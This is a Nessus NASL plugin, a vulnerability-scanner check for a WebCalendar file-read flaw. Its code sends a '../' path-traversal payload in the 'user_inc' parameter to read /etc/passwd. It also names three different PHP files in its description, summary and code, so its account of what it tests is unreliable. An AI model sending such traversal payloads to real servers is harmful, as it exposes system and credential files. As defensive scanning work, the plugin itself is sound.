#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11794);
 script_bugtraq_id(8237);
 script_version ("$Revision$");
 
 name["english"] = "WebCalendar file reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is hosting webcalendar, a set of PHP scripts.

This set of scripts may allow an attacker to read arbitrary
files on this host by supplying a filename to the 'user_inc'
argument of the file long.php.


Solution : Upgrade WebCalendar 0.9.42
Risk factor : Serious";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of remotehtmlview.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/login.php?user_inc=../../../../../../../../../../../../../../../etc/passwd"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*:", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
foreach d (dir)
{
 if(isnull(dirs))dirs = make_list(string(d, "/webcalendar"));
 else dirs = make_list(dirs, string(d, "/webcalendar"));
}

dirs = make_list(dirs, "/webcalendar");


foreach dir (dirs)
{
check(loc:dir);
}
